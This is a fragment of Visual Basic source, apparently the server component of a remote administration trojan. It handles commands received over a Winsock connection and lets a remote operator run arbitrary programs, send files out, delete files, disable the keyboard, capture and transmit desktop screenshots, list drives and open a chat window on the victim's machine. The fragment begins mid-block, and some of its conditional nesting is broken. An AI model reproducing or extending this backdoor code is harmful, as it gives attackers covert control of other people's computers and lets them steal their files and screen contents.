Time = Cmd(1)
WS.SendData "TimeSet"
ElseIf Cmd(0) = "SetDate" Then
Date = Cmd(1)
WS.SendData "DateSet"
End If

If Cmd(0) = "RunFile" Then
Shell Cmd(1)
End If

If Cmd(0) = "Download" Then
stopit = False
txtpath2.Text = Cmd(1)
txtfile.Text = GetFileName(txtpath2.Text)
File.SendData "File," & txtfile.Text
DoEvents
Open txtpath2.Text For Binary As 1

If Cmd(0) = "DisableKeyboard" Then
Shell "rundll32 keyboard,disable"
WS.SendData "KeyboardDisabled"
End If
End If

If Cmd(0) = "InitiateChat" Then
Load frmServerChat
frmServerChat.Show
WS.SendData "ChatInitiated"
End If

If Cmd(0) = "ChatMessage" Then
frmServerChat.txtchat.Text = Cmd(1)
End If

If Cmd(0) = "CloseChat" Then
frmServerChat.Hide
Unload frmServerChat
WS.SendData "ChatClosed"
End If

If Cmd(0) = "RunFile" Then
On Error GoTo error_handler
Shell Cmd(1), vbNormalFocus
WS.SendData "FileRun"
error_handler:
WS.SendData "FileError"
End If

If Cmd(0) = "PlayWav" Then
PlayMedia Cmd(1)
WS.SendData "WavPlayed"
End If

If Cmd(0) = "DeleteFile" Then
Kill Cmd(1)
WS.SendData "FileDeleted"
End If

If Cmd(0) = "GetDrives" Then
SendDrives
End If

If Cmd(0) = "FullScreenShot" Then
       Get_Desktop (App.Path & "\DESKTOP.jpg")
       thedata = App.Path & "\DESKTOP.jpg"
       SendDesktop thedata, WS
       WS.SendData "ScreenShotComplete"
       Kill App.Path & "\DESKTOP.jpg"
       End If
End Sub

